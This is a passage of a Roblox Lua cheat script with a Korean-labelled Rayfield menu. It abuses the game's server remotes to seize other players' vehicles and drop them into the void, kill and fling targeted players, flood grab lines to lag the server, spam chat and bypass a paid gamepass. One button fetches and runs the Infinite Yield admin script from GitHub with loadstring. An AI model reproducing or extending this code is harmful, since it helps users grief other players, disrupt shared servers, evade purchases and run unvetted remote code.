        local part = char:FindFirstChild(name)
        if part and part:IsA("BasePart") then
            part.Transparency = 0
        end
    end

    for _, obj in ipairs(char:GetChildren()) do
        if obj:IsA("Accessory") and obj.Name ~= "TypingKeyboardMyWorld" then
            for _, v in ipairs(obj:GetChildren()) do
                if v:IsA("BasePart") then
                    v.Transparency = 0
                end
            end
        end
    end

    local mouseHit = mouse.Hit
    local targetPos = mouseHit.Position + Vector3.new(0, 5, 0)
    local newCFrame = CFrame.new(targetPos) * currentRotation

    if ragdolled.Value == true then
        char:PivotTo(newCFrame)
    else
        hrp.CFrame = newCFrame
    end
end

function AntiBlobUseF()
    task.spawn(function()
        local FallenY = workspace.FallenPartsDestroyHeight
        local targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100
        local dropPos = CFrame.new(0, targetY, 9999)
        local plr = game.Players.LocalPlayer
        local targetItems = {"CreatureBlobman", "TractorRed", "TractorOrange", "TractorGreen", "SantaSleigh"}

        local processedBlobs = {}
        local cleanupInterval = 2

        while AntiBlobUseT do
            task.wait(0.01)

            local char = plr.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local hum = char and char:FindFirstChildOfClass("Humanoid")

            if not char or not root or not hum then continue end

            local myPlotNumber = nil
            local plots = workspace:FindFirstChild("Plots")
            if plots then
                for i = 1, 5 do
                    local plot = plots:FindFirstChild("Plot" .. i)
                    local plotSign = plot and plot:FindFirstChild("PlotSign")
                    local owners = plotSign and plotSign:FindFirstChild("ThisPlotsOwners")
                    local ownerVal = owners and owners:FindFirstChildOfClass("StringValue")
                    if ownerVal and ownerVal.Value == plr.Name then
                        myPlotNumber = i
                        break
                    end
                end
            end

            local function collectItemsFromFolder(folder)
                local items = {}
                for _, item in ipairs(folder:GetChildren()) do
                    if item:IsA("Model") and table.find(targetItems, item.Name) then
                        if item:FindFirstChild("VehicleSeat") then
                            local vs = item:FindFirstChildOfClass("VehicleSeat")
                            if vs and vs.Occupant then 
                                if vs.Occupant == hum then
                                    table.insert(items, item)
                                end
                                continue 
                            end

                            local itemId = tostring(item:GetDebugId())
                            if not processedBlobs[itemId] then
                                table.insert(items, item)
                            end
                        end
                    end
                end
                return items
            end

            local allItems = {}
            for _, player in ipairs(game.Players:GetPlayers()) do
                if player == plr then continue end
                if WhiteListMode then
                    local inWhitelist = false
                    for _, whiteName in ipairs(Whitelist) do 
                        if player.Name == whiteName then 
                            inWhitelist = true 
                            break 
                        end 
                    end
                    if inWhitelist then continue end
                end
                local folder = workspace:FindFirstChild(player.Name .. "SpawnedInToys")
                if folder then 
                    for _, item in ipairs(collectItemsFromFolder(folder)) do 
                        table.insert(allItems, item) 
                    end 
                end
            end

            local plotItems = workspace:FindFirstChild("PlotItems")
            if plotItems then
                for i = 1, 5 do
                    if i == myPlotNumber then continue end
                    local plot = plotItems:FindFirstChild("Plot" .. i)
                    if plot then 
                        for _, item in ipairs(collectItemsFromFolder(plot)) do 
                            table.insert(allItems, item) 
                        end 
                    end
                end
            end

            for _, item in ipairs(allItems) do
                if not AntiBlobUseT then break end

                local itemId = tostring(item:GetDebugId())

                if processedBlobs[itemId] then
                    continue
                end

                local char = plr.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local hum = char and char:FindFirstChildOfClass("Humanoid")

                if not char or not root or not hum then break end

                local vs = item:FindFirstChildOfClass("VehicleSeat")

                if vs then
                    if vs.Occupant and vs.Occupant ~= hum then 
                        continue 
                    end

                    root.Anchored = true
                    vs:Sit(hum)

                    if hum and vs then
                    task.wait(0.1)
                    hum:ChangeState(Enum.HumanoidStateType.Running)
                    task.wait()
                    if item.PrimaryPart then item:SetPrimaryPartCFrame(dropPos) end
                    root.Anchored = false

                        if root and vs then
                            local connection
                            connection = vs.AncestryChanged:Connect(function()
                                if not vs or not vs.Parent then
                                    if connection then
                                        connection:Disconnect()
                                    end
                                    processedBlobs[itemId] = true

                                    task.delay(cleanupInterval, function()
                                        processedBlobs[itemId] = nil
                                    end)
                                end
                            end)

                            task.delay(2, function()
                                if connection then
                                    connection:Disconnect()
                                end
                                processedBlobs[itemId] = true

                                task.delay(cleanupInterval, function()
                                    processedBlobs[itemId] = nil
                                end)
                            end)
                        end
                    end

                    task.wait(0.0001)
                end

                break
            end
        end
    end)
end

local TARGET_INDEX = 1

local Remotes = {
    Spawn = rs:FindFirstChild("MenuToys"):FindFirstChild("SpawnToyRemoteFunction"),
    SetOwner = rs:FindFirstChild("GrabEvents"):FindFirstChild("SetNetworkOwner"),
    Extend = rs:FindFirstChild("GrabEvents"):FindFirstChild("ExtendGrabLine"),
    Explode = rs:FindFirstChild("BombEvents"):FindFirstChild("BombExplode")
}

function LoopSnowBallF()
    if SnowballLoopThread and coroutine.status(SnowballLoopThread) ~= "dead" then
        return
    end

    if not playersInLoop1V or type(playersInLoop1V) ~= "table" then
        playersInLoop1V = {}
    end

    SnowballLoopThread = coroutine.create(function()
        while LoopSnowBallT do
            task.wait(0.2)

            local myHrp = plr.Character and plr.Character:FindFirstChild("HumanoidRootPart")
            if not myHrp then
                continue
            end

            local ball = inv:FindFirstChild("BallSnowball")
            if not ball then
                task.spawn(function()
                    Remotes.Spawn:InvokeServer("BallSnowball", myHrp.CFrame * CFrame.new(0, 10, 20), Vector3.new(0, 0, 0))
                end)
                task.wait(0.15)
                continue
            end

            if #playersInLoop1V == 0 then
                task.wait(0.1)
                continue
            end

            TARGET_INDEX = TARGET_INDEX > #playersInLoop1V and 1 or TARGET_INDEX
            local targetName = playersInLoop1V[TARGET_INDEX]
            local targetPlayer = game.Players:FindFirstChild(targetName)

            if not targetPlayer or targetPlayer == plr or not targetPlayer.Character then
                table.remove(playersInLoop1V, TARGET_INDEX)
                if TARGET_INDEX > #playersInLoop1V then
                    TARGET_INDEX = 1
                end
                continue
            end

            local targetHrp = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
            if not targetHrp then
                table.remove(playersInLoop1V, TARGET_INDEX)
                if TARGET_INDEX > #playersInLoop1V then
                    TARGET_INDEX = 1
                end
                continue
            end

            TARGET_INDEX = TARGET_INDEX + 1
            if TARGET_INDEX > #playersInLoop1V then
                TARGET_INDEX = 1
            end

            local ballSPart = ball:FindFirstChild("SoundPart")
            if not ballSPart then
                task.wait(0.1)
                continue
            end

            Remotes.SetOwner:FireServer(ballSPart, ballSPart.CFrame)
            task.wait(0.05)
            ballSPart.CFrame = targetHrp.CFrame

            task.wait(0.05)
            Remotes.Explode:FireServer({
                Radius = 0, 
                Color = Color3.new(0, 0, 0), 
                TimeLength = 0, 
                Model = ball, 
                Type = "SnowPoof", 
                ExplodesByFire = false, 
                MaxForcePerStudSquared = 0, 
                Hitbox = ballSPart, 
                ImpactSpeed = 0, 
                ExplodesByPointy = false, 
                DestroysModel = true, 
                PositionPart = ballSPart
            }, Vector3.new(0, 0, 0))

            task.wait(0.15)
        end

        SnowballLoopThread = nil
    end)

    coroutine.resume(SnowballLoopThread)
end





LineLagV = 50
function LineLagF()
for i, e in game.Players:GetPlayers() do
if table.find(Whitelist, e.Name) then return end
end

while wait(0.5) and LineLagT do
for a = 0, LineLagV do
for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
if player.Character.Torso ~= nil then
rs.GrabEvents.CreateGrabLine:FireServer(player.Character.Torso, player.Character.Torso.CFrame)
end
end
end
end
end

----------------------------------------------------------------------------------------- [ 시작 설정 ]



-- ================== [ 유틸리티 기능 ] ==================

UtilityTab:CreateSection("환경 및 시야")

-- 1. 줌 제한 해제
UtilityTab:CreateButton({
    Name = "최대 줌 거리 무제한",
    Callback = function()
        pcall(function()
            plr.CameraMaxZoomDistance = 100000000000000000000000000000000000000
        end)
    end,
})

-- 2. 안개 제거
UtilityTab:CreateButton({
    Name = "맵 안개 제거",
    Callback = function()
        pcall(function()
            game:GetService("Lighting").FogEnd = 9e9
        end)
    end,
})

-- 3. 시간대 변경 (낮)
UtilityTab:CreateButton({
    Name = "서버 시간 낮으로 고정",
    Callback = function()
        pcall(function()
            game:GetService("Lighting").ClockTime = 14
        end)
    end,
})

UtilityTab:CreateSection("캐릭터 비주얼")

-- 4. 캐릭터 반투명화
UtilityTab:CreateToggle({
    Name = "유령 모드 (반투명)",
    CurrentValue = false,
    Callback = function(Value)
        pcall(function()
            local char = plr.Character
            if char then
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") and v.Name ~= "HumanoidRootPart" then
                        v.Transparency = Value and 0.5 or 0
                    end
                end
            end
        end)
    end,
})

-- 5. 머리 크기 변경 (시각용)
UtilityTab:CreateSlider({
    Name = "머리 크기 조절",
    Range = {0, 100},
    Increment = 1,
    CurrentValue = 1,
    Callback = function(Value)
        pcall(function()
            local head = plr.Character and plr.Character:FindFirstChild("Head")
            if head then
                head.Size = Vector3.new(Value, Value, Value)
            end
        end)
    end,
})

-- 6. 내 이름 숨기기 (로컬 전용)
UtilityTab:CreateToggle({
    Name = "내 머리위 이름표 제거",
    CurrentValue = false,
    Callback = function(Value)
        pcall(function()
            local head = plr.Character and plr.Character:FindFirstChild("Head")
            if head then
                local bgui = head:FindFirstChildOfClass("BillboardGui")
                if bgui then bgui.Enabled = not Value end
            end
        end)
    end,
})

UtilityTab:CreateSection("시스템 유틸")

-- 7. 핑 확인
UtilityTab:CreateButton({
    Name = "현재 핑(Ping) 확인",
    Callback = function()
        pcall(function()
            local ping = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue())
            Rayfield:Notify({Title = "시스템", Content = "현재 핑: "..ping.."ms", Duration = 3})
        end)
    end,
})

-- 8. 물리 렉 감소
UtilityTab:CreateButton({
    Name = "물리 렉 최적화",
    Callback = function()
        pcall(function()
            for _, v in pairs(workspace:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Velocity = Vector3.new(0,0,0)
                    v.RotVelocity = Vector3.new(0,0,0)
                end
            end
        end)
    end,
})

-- 9. 서버 인원수 확인
UtilityTab:CreateButton({
    Name = "서버 총 인원수 확인",
    Callback = function()
        local count = #game.Players:GetPlayers()
        Rayfield:Notify({Title = "서버 정보", Content = "현재 인원: "..count.."명", Duration = 3})
    end,
})

-- 10. 채팅창 숨기기/보이기
UtilityTab:CreateToggle({
    Name = "채팅 UI 숨기기",
    CurrentValue = false,
    Callback = function(Value)
        pcall(function()
            plr.PlayerGui.Chat.Frame.Visible = not Value
        end)
    end,
})


UtilityTab:CreateSection("물리 및 엔진 조작")

UtilityTab:CreateToggle({
    Name = "무마찰 모드 (미끄러지기)",
    CurrentValue = false,
    Callback = function(Value)
        pcall(function()
            local char = game.Players.LocalPlayer.Character
            for _, v in pairs(char:GetChildren()) do
                if v:IsA("BasePart") then
                    v.CustomPhysicalProperties = PhysicalProperties.new(Value and 0 or 0.7, 0.3, 0.5)
                end
            end
        end)
    end,
})


local clicking = false


UtilityTab:CreateButton({
    Name = "모든 화면 효과 제거 (깔끔한 시야)",
    Callback = function()
        pcall(function()
            local lighting = game:GetService("Lighting")
            for _, v in pairs(lighting:GetChildren()) do
                if v:IsA("PostProcessEffect") or v:IsA("BloomEffect") or v:IsA("BlurEffect") then
                    v.Enabled = false
                end
            end
        end)
    end,
})

UtilityTab:CreateSection("플레이어 특수 조작")

-- 4. 1인칭 강제 고정 (조준 시 유용)
UtilityTab:CreateToggle({
    Name = "강제 1인칭 시점",
    CurrentValue = false,
    Callback = function(Value)
        pcall(function()
            game.Players.LocalPlayer.CameraMode = Value and Enum.CameraMode.LockFirstPerson or Enum.CameraMode.Classic
        end)
    end,
})


UtilityTab:CreateSlider({
    Name = "캐릭터 회전 민감도",
    Range = {1, 10},
    Increment = 1,
    CurrentValue = 3,
    Callback = function(Value)
        pcall(function()
            game.Players.LocalPlayer.Character.Humanoid.AutoRotate = true
            
        end)
    end,
})



UtilityTab:CreateButton({
    Name = "맵 전체 오브젝트 개수 스캔",
    Callback = function()
        local count = #workspace:GetDescendants()
        Rayfield:Notify({Title="스캔 완료", Content="현재 맵에 "..count.."개의 물체가 있습니다.", Duration=3})
    end,
})


UtilityTab:CreateButton({
    Name = "서버훅v2",
    Callback = function()
        pcall(function()
            local HttpService = game:GetService("HttpService")
            local TPS = game:GetService("TeleportService")
            local Servers = HttpService:JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"))
            for _, s in pairs(Servers.data) do
                if s.playing < s.maxPlayers and s.id ~= game.JobId then
                    TPS:TeleportToPlaceInstance(game.PlaceId, s.id, game.Players.LocalPlayer)
                    break
                end
            end
        end)
    end,
})

UtilityTab:CreateSection("이동 최적화")

UtilityTab:CreateToggle({
    Name = "관성 제거   <font color='rgb(0,255,0)'>[굳]</font>",
    CurrentValue = true,
    Callback = function(Value)
        _G.NoInertia = Value
        pcall(function()
            local char = game.Players.LocalPlayer.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            
            if _G.NoInertia then
                
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.CustomPhysicalProperties = PhysicalProperties.new(100, 0.3, 0.5)
                    end
                end
                
                
                task.spawn(function()
                    while _G.NoInertia do
                        if hum and hum.MoveDirection.Magnitude <= 0 then
                            local hrp = char:FindFirstChild("HumanoidRootPart")
                            if hrp then
                                hrp.Velocity = Vector3.new(0, hrp.Velocity.Y, 0)
                            end
                        end
                        task.wait()
                    end
                end)
            else
                
                for _, v in pairs(char:GetChildren()) do
                    if v:IsA("BasePart") then
                        v.CustomPhysicalProperties = nil
                    end
                end
            end
        end)
    end,
})





RankTab:CreateSection("제작자")
RankTab:CreateLabel("제작자 : baby_Alpaca | 알파카")

RankTab:CreateSection("친구 목록")
RankTab:CreateLabel("헬로, 썸머, 누나, 이에스, 까망, 연우, 온유, 대환, 서은")

RankTab:CreateSection("어드민 권한 획득")

local AdminHackButton = RankTab:CreateButton({
    Name = "iY 어드민 핵",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
        
        Rayfield:Notify({
            Title = "🔓 iY 어드민",
            Content = "Infinite Yield 어드민 스크립트가 실행되었습니다.",
            Duration = 5
        })
    end
})
passTab:CreateSection("커스텀 그라데이션 설정")

passTab:CreateInput({
   Name = "그라데이션 레이어 수 설정 (2 ~ 4)",
   PlaceholderText = "기본값: 2",
   RemoveTextAfterFocusLost = false,
   Callback = function(text)
      local num = tonumber(text)
      if num and num >= 2 and num <= 4 then
         GradientLayers = math.floor(num)
         if CustomGradientEnabled and game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
            pcall(function()
               local points = {}
               if GradientLayers == 2 then
                  points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
               elseif GradientLayers == 3 then
                  points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val or Color3.new(0,0,0))}
               elseif GradientLayers == 4 then
                  points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val or Color3.new(0,0,0)), ColorSequenceKeypoint.new(1, Color4 or Color3.new(0,1,0))}
               end
               game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
            end)
         end
      else
         Rayfield:Notify({
            Name = "Error",
            Content = "Layer amount must be between 2 and 4.",
            Duration = 3,
            Image = 4483345998,
         })
      end
   end,
})

passTab:CreateColorPicker({
    Name = "색상 1",
    Color = Color3.new(1, 0, 0),
    Callback = function(color)
        Color1 = color
        if CustomGradientEnabled and game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
            pcall(function()
               local points = {}
               if GradientLayers == 2 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
               elseif GradientLayers == 3 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val or Color3.new(0,0,0))}
               elseif GradientLayers == 4 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val or Color3.new(0,0,0)), ColorSequenceKeypoint.new(1, Color4 or Color3.new(0,1,0))} end
               game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
            end)
        end
    end
})

passTab:CreateColorPicker({
    Name = "색상 2",
    Color = Color3.new(0, 0, 1),
    Callback = function(color)
        Color2 = color
        if CustomGradientEnabled and game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
            pcall(function()
               local points = {}
               if GradientLayers == 2 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
               elseif GradientLayers == 3 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val or Color3.new(0,0,0))}
               elseif GradientLayers == 4 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val or Color3.new(0,0,0)), ColorSequenceKeypoint.new(1, Color4 or Color3.new(0,1,0))} end
               game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
            end)
        end
    end
})

passTab:CreateColorPicker({
    Name = "색상 3",
    Color = Color3.new(0, 0, 0),
    Callback = function(color)
        Color3_Val = color
        if CustomGradientEnabled and game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
            pcall(function()
               local points = {}
               if GradientLayers == 2 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
               elseif GradientLayers == 3 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val)}
               elseif GradientLayers == 4 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val), ColorSequenceKeypoint.new(1, Color4 or Color3.new(0,1,0))} end
               game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
            end)
        end
    end
})

passTab:CreateColorPicker({
    Name = "색상 4",
    Color = Color3.new(1, 1, 0),
    Callback = function(color)
        Color4 = color
        if CustomGradientEnabled and game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
            pcall(function()
               local points = {}
               if GradientLayers == 2 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
               elseif GradientLayers == 3 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val or Color3.new(0,0,0))}
               elseif GradientLayers == 4 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val or Color3.new(0,0,0)), ColorSequenceKeypoint.new(1, Color4)} end
               game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
            end)
        end
    end
})

passTab:CreateToggle({
   Name = "커스텀 그라데이션 적용  <font color='rgb(255,0,0)'>[오너]</font>",
   CurrentValue = false,
   Flag = "CustomGradientToggle",
   Callback = function(val)
      CustomGradientEnabled = val
      if val then
          RainbowLoopEnabled = false 
          if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
              pcall(function()
                 local points = {}
                 if GradientLayers == 2 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(1, Color2)}
                 elseif GradientLayers == 3 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.5, Color2), ColorSequenceKeypoint.new(1, Color3_Val or Color3.new(0,0,0))}
                 elseif GradientLayers == 4 then points = {ColorSequenceKeypoint.new(0, Color1), ColorSequenceKeypoint.new(0.33, Color2), ColorSequenceKeypoint.new(0.66, Color3_Val or Color3.new(0,0,0)), ColorSequenceKeypoint.new(1, Color4 or Color3.new(0,1,0))} end
                 game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new(points))
              end)
          end
      end
   end,
})

passTab:CreateSection("라인 색상 고정 프리셋")

passTab:CreateButton({
   Name = "무지개 프리셋 (고정 고해상도)",
   Callback = function()
      CustomGradientEnabled = false
      RainbowLoopEnabled = false
      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
          pcall(function()
             game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(1,0,0)),
                ColorSequenceKeypoint.new(0.16, Color3.new(1,1,0)),
                ColorSequenceKeypoint.new(0.33, Color3.new(0,1,0)),
                ColorSequenceKeypoint.new(0.5, Color3.new(0,1,1)),
                ColorSequenceKeypoint.new(0.66, Color3.new(0,0,1)),
                ColorSequenceKeypoint.new(0.83, Color3.new(1,0,1)),
                ColorSequenceKeypoint.new(1, Color3.new(1,0,0))
             }))
          end)
      end
   end,
})

passTab:CreateButton({
   Name = "불꽃 프리셋 (레드/오렌지/옐로우)",
   Callback = function()
      CustomGradientEnabled = false
      RainbowLoopEnabled = false
      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
          pcall(function()
             game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(1,0,0)),
                ColorSequenceKeypoint.new(0.5, Color3.new(1,0.5,0)),
                ColorSequenceKeypoint.new(1, Color3.new(1,1,0))
             }))
          end)
      end
   end,
})

passTab:CreateButton({
   Name = "바다 프리셋 (딥블루/아쿠아)",
   Callback = function()
      CustomGradientEnabled = false
      RainbowLoopEnabled = false
      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
          pcall(function()
             game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(0,0,1)),
                ColorSequenceKeypoint.new(0.5, Color3.new(0,1,1)),
                ColorSequenceKeypoint.new(1, Color3.new(0,0.5,0.5))
             }))
          end)
      end
   end,
})

passTab:CreateButton({
   Name = "석양 프리셋 (퍼플/핑크/오렌지)",
   Callback = function()
      CustomGradientEnabled = false
      RainbowLoopEnabled = false
      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
          pcall(function()
             game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(0.5,0,0.5)),
                ColorSequenceKeypoint.new(0.5, Color3.new(1,0,0.5)),
                ColorSequenceKeypoint.new(1, Color3.new(1,0.5,0))
             }))
          end)
      end
   end,
})

passTab:CreateButton({
   Name = "네온 프리셋 (민트/마젠타)",
   Callback = function()
      CustomGradientEnabled = false
      RainbowLoopEnabled = false
      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
          pcall(function()
             game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.new(0,1,1)),
                ColorSequenceKeypoint.new(1, Color3.new(1,0,1))
             }))
          end)
      end
   end,
})

passTab:CreateSection("실시간 애니메이션 효과")

passTab:CreateToggle({
   Name = "실시간 무지개 그라데이션 루프",
   CurrentValue = false,
   Flag = "RainbowLoopToggle",
   Callback = function(val)
      RainbowLoopEnabled = val
      if val then
          CustomGradientEnabled = false
          task.spawn(function()
              while RainbowLoopEnabled do
                  for i = 0, 1, 0.01 do
                      if not RainbowLoopEnabled then break end
                      if game:GetService("ReplicatedStorage"):FindFirstChild("DataEvents") then
                          pcall(function()
                              game:GetService("ReplicatedStorage").DataEvents.UpdateLineColorsEvent:FireServer(ColorSequence.new({
                                  ColorSequenceKeypoint.new(0, Color3.fromHSV(i, 1, 1)),
                                  ColorSequenceKeypoint.new(1, Color3.fromHSV((i + 0.5) % 1, 1, 1))
                              }))
                          end)
                      end
                      task.wait(0.05)
                  end
              end
          end)
      end
   end,
})

passTab:CreateSection("게임패스 잠금해제")

passTab:CreateButton({
   Name = "긴줄 잠금해제   <font color='rgb(255,19,130)'>[바이패싱]</font>",
   Callback = function()
      local Reach = Instance.new("BoolValue")
      Reach.Name = "FartherReach"
      Reach.Parent = game.Players.LocalPlayer
      Reach.Value = true

      local GamepassEvents = game:GetService("ReplicatedStorage"):FindFirstChild("GamepassEvents")
      local Notifier = GamepassEvents and GamepassEvents:FindFirstChild("FurtherReachBoughtNotifier")

      if Notifier and getconnections then
         local ran = false
         for _, connection in ipairs(getconnections(Notifier.OnClientEvent)) do
            pcall(connection.Function)
            ran = true
         end
         if ran then
            Rayfield:Notify({
               Name = "Success",
               Content = "긴줄잠금해제완료!",
               Duration = 4,
               Image = 10734951437
            })
         else
            Rayfield:Notify({
               Name = "Failed",
               Content = "긴줄잠금해제실패!",
               Duration = 4,
               Image = 10734925828
            })
         end
      else
         Rayfield:Notify({
            Name = "Failed",
            Content = "긴줄잠금해제실패!",
            Duration = 4,
            Image = 10734925828
         })
      end
   end,
})


getTab:CreateSection("Gam")
getTab:CreateToggle({
    Name = "킥알림    <font color='rgb(255,10,123)'>[프라임]</font>",
    CurrentValue = true,
    Flag = "5",
    Callback = function(Value)
        ifKickThenT = Value
        if Value then
            ifKickThenF()
        end
    end
})


local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")

DevTab:CreateSection("Chat")
DevTab:CreateInput({
    Name = "소리",
    CurrentValue = "",
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "SoundInput",
    Callback = function(Value)
        spamText = tostring(Value)
    end
})

DevTab:CreateInput({
    Name = "소리 나오는 속도",
    CurrentValue = "",
    PlaceholderText = "Value",
    RemoveTextAfterFocusLost = false,
    Flag = "SpeedInput",
    Callback = function(Value)
        local num = tonumber(Value)
        if num and num > 0 then
            SpeedSpam = num
        else
            SpeedSpam = 0.1
        end
    end
})

DevTab:CreateToggle({ 
    Name = "토클", 
    CurrentValue = false,
    Flag = "SpamToggle",
    Callback = function(Value)
        spamming = Value

        if spamConnection then
            spamConnection:Disconnect()
            spamConnection = nil
        end

        if Value then
            local accumulator = 0

            spamConnection = RunService.Heartbeat:Connect(function(deltaTime)
                if not spamming then 
                    return 
                end

                accumulator = accumulator + deltaTime
                if accumulator >= SpeedSpam then
                    accumulator = 0

                    local success, errorMsg = pcall(function()
                        local message = "/e " .. (spamText)
                        TextChatService.TextChannels.RBXGeneral:SendAsync(message)
                    end)
                end
            end)
        end
    end
})
DevTab:CreateSection("열차")
DevTab:CreateButton({
    Name = "열차조종   <font color='rgb(0,155,0)'>[삭제]</font>",
    Callback = TrSw
})

LoopTab:CreateSection("특별기능")
local Loop1 = LoopTab:CreateToggle({
    Name = "PTM",
    CurrentValue = false,
    Flag = "21",
    Callback = function(Value)
        loopPlayerT3 = Value
        if loopPlayerT3 then
            table.clear(playersInLoop2V)
            for i, e in ipairs(playersInLoop1V) do
                local nameOnly = e:match("^(.-) %(") or e
                table.insert(playersInLoop2V, nameOnly)
            end
            loopPlayerF3()
        else
            loopPlayerT3 = false
            table.clear(playersInLoop2V)
        end
    end
})

LoopTab:CreateButton({
    Name = "킬    <font color='rgb(255,0,0)'>[오너]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
        for i, e in ipairs(playersInLoop1V) do
            local nameOnly = e:match("^(.-) %(") or e
            table.insert(playersInLoop2V, nameOnly)
        end
        
        UpdateCurrentBlobman()
        
        for _, name in ipairs(playersInLoop2V) do
            local player = game.Players:FindFirstChild(name)
            if player and not table.find(Whitelist, player.Name) then
                local character, hrp, head = safeGetCharacterParts(player)
                local humanoid = character and character:FindFirstChildOfClass("Humanoid")
                if PPs:FindFirstChild(name) or inv:FindFirstChild(name) then continue end
                
                if humanoid and humanoid.Health > 0 then
                    local myChar = plr.Character
                    local myHrp = myChar and myChar:FindFirstChild("HumanoidRootPart")
                    if not myHrp then continue end
                    local originCF = myHrp.CFrame
                    
                    TP(player)
                    task.wait(0.1)
                    
                    while true do
                        rs.GrabEvents.SetNetworkOwner:FireServer(head, head.CFrame)
                        local ownerTag = head:FindFirstChild("PartOwner")
                        if ownerTag and ownerTag:IsA("StringValue") and ownerTag.Value == plr.Name then
                            break
                        end
                        task.wait()
                    end
                    
                    if humanoid.RigType ~= Enum.HumanoidRigType.R15 and humanoid.SeatPart == nil then humanoid.RigType = Enum.HumanoidRigType.R15 end

                    if humanoid.BreakJointsOnDeath == true and humanoid.SeatPart == nil then humanoid.BreakJointsOnDeath = false end

                    if head:FindFirstChildOfClass("BallSocketConstraint") then head.BallSocketConstraint.Attachment0 = nil end

                    local FallenY = workspace.FallenPartsDestroyHeight
                    local targetY = (FallenY <= -50000 and -49999) or (FallenY <= -100 and -99) or -100
                    local storso = character:FindFirstChild("Torso")
                    if storso then
                        storso.CFrame = CFrame.new(storso.Position.X, targetY, storso.Position.Z)
                    end
                    
                    if originCF then BACK(originCF) end
                end
                task.wait(0.1)
            end
        end
    end
})

LoopTab:CreateButton({
    Name = "날리기    <font color='rgb(255,0,0)'>[오너]</font>",
    Callback = function()
        table.clear(playersInLoop2V)
        for i, e in ipairs(playersInLoop1V) do
            local nameOnly = e:match("^(.-) %(") or e
            table.insert(playersInLoop2V, nameOnly)
        end
        
        UpdateCurrentBlobman()
        
        for _, name in ipairs(playersInLoop2V) do
            local player = game.Players:FindFirstChild(name)
            if player and not table.find(Whitelist, player.Name) then
